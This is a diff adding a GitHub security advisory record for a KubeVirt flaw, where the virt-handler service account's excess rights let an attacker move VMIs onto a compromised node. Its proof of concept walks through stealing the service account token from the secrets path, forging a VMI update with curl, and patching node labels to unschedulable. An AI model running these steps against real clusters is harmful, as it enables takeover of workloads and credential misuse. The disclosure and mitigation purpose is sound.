@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-7xgm-5prm-v5gc",
+  "modified": "2025-11-17T21:43:24Z",
+  "published": "2025-11-06T23:35:49Z",
+  "aliases": [
+    "CVE-2025-64436",
+    "GO-2025-4104"
+  ],
+  "summary": "KubeVirt Excessive Role Permissions Could Enable Unauthorized VMI Migrations Between Nodes",
+  "details": "### Summary\n_Short summary of the problem. Make the impact and severity as clear as possible.\n\nThe permissions granted to the `virt-handler` service account, such as the ability to update VMI and patch nodes, could be abused to force a VMI migration to an attacker-controlled node.\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\nFollowing the [GitHub security advisory published on March 23 2023](https://github.com/kubevirt/kubevirt/security/advisories/GHSA-cp96-jpmq-xrr2), a `ValidatingAdmissionPolicy` was introduced to impose restrictions on which sections of node resources the `virt-handler` service account can modify. For instance, the `spec` section of nodes has been made immutable, and modifications to the `labels` section are now limited to `kubevirt.io`-prefixed labels only. This vulnerability could otherwise allow an attacker to mark all nodes as unschedulable, potentially forcing the migration or creation of privileged pods onto a compromised node.\n\n\nHowever, if a `virt-handler` service account is compromised, either through the pod itself or the underlying node, an attacker may still modify node labels, both on the compromised node and on other nodes within the cluster. Notably, `virt-handler` sets a specific `kubevirt.io` boolean label, `kubevirt.io/schedulable`, which indicates whether the node can host VMI workloads. An attacker could repeatedly patch other nodes by setting this label to `false`, thereby forcing all #acr(\"vmi\") instances to be scheduled exclusively on the compromised node.\n\n[Another finding](https://github.com/kubevirt/kubevirt/security/advisories/GHSA-ggp9-c99x-54gp) describes how a compromised `virt-handler` instance can perform operations on other nodes that are intended to be executed solely by `virt-api`. This significantly increases both the impact and the likelihood of the vulnerability being exploited\n\n\nAdditionally, by default, the `virt-handler` service account has permission to update all VMI resources across the cluster, including those not running on the same node. While a security mechanism similar to the kubelet's `NodeRestriction` feature exists to limit this scope, it is controlled by a feature gate and is therefore not enabled by default.\n\n\n\n### PoC\n_Complete instructions, including specific configuration details, to reproduce the vulnerability._\n\nBy injecting incorrect data into a running VMI, for example, by altering the `kubevirt.io/nodeName` label to reference a different node, the VMI is marked as terminated and its state transitions to `Succeeded`. This incorrect state could mislead an administrator into restarting the VMI, causing it to be re-created on a node of the attacker's choosing. As an example, the following demonstrates how to instantiate a basic VMI:\n\n```yaml\napiVersion: kubevirt.io/v1\nkind: VirtualMachine\nmetadata:\n  name: testvm\nspec:\n  runStrategy: Always\n  template:\n    metadata:\n      labels:\n        kubevirt.io/size: small\n        kubevirt.io/domain: testvm\n    spec:\n      domain:\n        devices:\n          disks:\n            - name: containerdisk\n              disk:\n                bus: virtio\n            - name: cloudinitdisk\n              disk:\n                bus: virtio\n          interfaces:\n          - name: default\n            masquerade: {}\n        resources:\n          requests:\n            memory: 64M\n      networks:\n      - name: default\n        pod: {}\n      volumes:\n        - name: containerdisk\n          containerDisk:\n            image: quay.io/kubevirt/cirros-container-disk-demo\n        - name: cloudinitdisk\n          cloudInitNoCloud:\n            userDataBase64: SGkuXG4=\n```\n\nThe VMI is then created on a minikube node identified with `minikube-m02`:\n\n```bash\noperator@minikube:~$ kubectl get vmi testvm\nNAME     AGE   PHASE     IP           NODENAME       READY\ntestvm   20s   Running   10.244.1.8   minikube-m02   True\n```\n\nAssume that a `virt-handler` pod, running on node `minikube-m03`, is compromised and an attacker and the latter wants the `testvm` to be re-deployed on a controlled by them node.\n\nFirst, we retrieve the `virt-handler` service account token in order to be able to perform requests to the Kubernetes API:\n\n```bash\n# Get the `virt-handler` pod name\nattacker@minikube-m03:~$ kubectl get pods  -n kubevirt --field-selector spec.nodeName=minikube-m03 | grep virt-handler\nvirt-handler-kblgh               1/1     Running   0          8d\n# get the `virt-handler` SA account token\nattacker@minikube-m03:~$ token=$(kubectl exec -it virt-handler-kblgh -n kubevirt -c virt-handler -- cat /var/run/secrets/kubernetes.io/serviceaccount/token) \n```\n\nThe attacker updates the VMI object labels in a way that makes it terminate:\n\n```bash\n# Save the current state of the VMI\nattacker@minikube-m03:~$ kubectl get vmi testvm -o json \u003e testvm.json\n# replace the current `nodeName` to another one in the JSON file\nattacker@minikube-m03:~$ sed -i 's/\"kubevirt.io\\/nodeName\": \"minikube-m02\"/\"kubevirt.io\\/nodeName\": \"minikube-m03\"/g' testvm.json \n# Perform the UPDATE request, impersonating the virt-handler\nattacker@minikube-m03:~$ curl https://192.168.49.2:8443/apis/kubevirt.io/v1/namespaces/default/virtualmachineinstances/testvm -k  -X PUT -d @testvm.json -H \"Content-Type: application/json\" -H \"Authorization: bearer $token\"\n# Get the current state of the VMI after the UPDATE\nattacker@minikube-m03:~$ kubectl get vmi testvm\nNAME     AGE   PHASE     IP           NODENAME       READY\ntestvm   42m   Running   10.244.1.8   minikube-m02   False # The VMI is not ready anymore\n# Get the current state of the pod after the UPDATE\nattacker@minikube-m03:~$ kubectl get pods | grep launcher\nvirt-launcher-testvm-z2fk4   0/3     Completed   0          44m  # the `virt-launcher` pod is completed\n```\n\nNow, the attacker can use the excessive permissions of the `virt-handler` service account to patch the `minikube-m02` node in order to mark it as unschedulable for VMI workloads:\n\n```bash\nattacker@minikube-m03:~$ curl https://192.168.49.2:8443/api/v1/nodes/minikube-m03 -k -H \"Authorization: Bearer $token\" -H \"Content-Type: application/strategic-merge-patch+json\" --data '{\"metadata\":{\"labels\":{\"kubevirt.io/schedulable\":\"false\"}}}' -X PATCH\n```\n\n**Note: This request could require multiple invocations as the `virt-handler` is continuously updating the schedulable state of the node it is running on**.\n\nFinally, an admin user decides to restart the VMI:\n\n```bash\nadmin@minikube:~$ kubectl delete -f testvm.yaml\nadmin@minikube:~$ kubectl apply -f testvm.yaml\nadmin@minikube:~$ kubectl get vmi testvm\nNAME     AGE   PHASE     IP            NODENAME       READY\ntestvm   80s   Running   10.244.0.15   minikube-m03   True\n```\n\nIdentifying the origin node of a request is not a straightforward task. One potential solution is to embed additional authentication data, such as the `userInfo` object, indicating the node on which the service account is currently running. This approach would be similar to Kubernetes' `NodeRestriction` feature gate. Since Kubernetes version 1.32, the `node` authorization mode, enforced via the `NodeRestriction` admission plugin, is enabled by default for kubelets running in the cluster. The equivalent feature gate in KubeVirt should likewise be enabled by default when the underlying Kubernetes version is 1.32 or higher.\n\nAn alternative approach would be to create a dedicated `virt-handler` service account for each node, embedding the node name into the account identity. This would allow the origin node to be inferred from the `userInfo.username` field of the `AdmissionRequest` object. However, this method introduces additional operational overhead in terms of monitoring and maintenance.\n\n\n### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nThis vulnerability could otherwise allow an attacker to mark all nodes as unschedulable, potentially forcing the migration or creation of privileged pods onto a compromised node.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "kubevirt.io/kubevirt",
+        "purl": "pkg:golang/kubevirt.io/kubevirt"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.7.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-7xgm-5prm-v5gc/GHSA-7xgm-5prm-v5gc.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevirt/kubevirt/security/advisories/GHSA-7xgm-5prm-v5gc"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64436"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/kubevirt/kubevirt"
+    }
+  ]
+}
